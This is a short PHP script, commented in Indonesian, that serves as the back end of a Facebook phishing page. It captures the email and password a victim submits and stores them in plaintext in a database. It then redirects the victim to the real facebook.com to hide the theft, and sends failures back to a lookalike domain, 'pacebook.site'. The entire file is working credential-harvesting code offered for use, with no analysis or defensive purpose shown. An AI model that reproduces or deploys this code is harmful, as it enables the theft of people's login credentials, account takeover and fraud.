<?php 

$koneksi = mysqli_connect("localhost","root","","facebook"); //koneksi database 

// Check connection
if (mysqli_connect_errno()){
	echo "Koneksi database gagal : " . mysqli_connect_error();
} //cek koneksi 


$email = mysqli_real_escape_string($koneksi, $_POST['email']); //menangkapan inputan dari html
$password = mysqli_real_escape_string($koneksi, $_POST['password']);//menangkapan inputan dari html

if(!$email && !$password) {  //jika email&pass kosong
    echo "<script>alert('Email atau Kata Sandi masih kosong.'); location.href='https://www.pacebook.site';</script>";
} else {

    $insert = mysqli_query($koneksi, "INSERT INTO users (email,password) VALUES ('$email','$password')");
        
    if($insert) {
        header("Location: https://facebook.com/");
    } else {
        echo "<script>alert('Gagal terhubung ke server facebook'); location.href='https://www.pacebook.site';</script>";
    }
}
 